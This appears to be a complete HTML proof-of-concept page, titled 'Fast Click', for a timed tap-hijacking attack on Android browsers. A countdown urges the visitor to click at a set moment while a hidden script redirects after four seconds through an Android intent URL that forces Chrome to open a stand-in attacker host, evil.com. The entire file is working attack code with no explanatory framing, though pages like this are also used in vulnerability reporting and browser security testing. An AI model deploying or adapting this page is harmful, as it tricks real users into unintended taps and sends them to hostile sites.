<style>
    #timer {
        position: fixed;
        top: 93%;
        right: 10%;
        width: 20%;
        font-size: 48px;
        font-weight: bold;
        font-family: Arial, sans-serif;
        text-align: center;
    }
</style>

<h1>Fast Click</h1>

<div id="timer">1</div>

<script>
setTimeout(() => {
    location.href = 'intent://evil.com/#Intent;scheme=https;package=com.android.chrome;end'
}, 4000)
</script>

<script>
    let count = 1;
    const timer = document.getElementById("timer");

    const interval = setInterval(() => {
        count++;

        if (count <= 3) {
            timer.textContent = count;
        } else {
            timer.textContent = "CLICKK!!!";
            clearInterval(interval);
        }
    }, 1000);
</script>
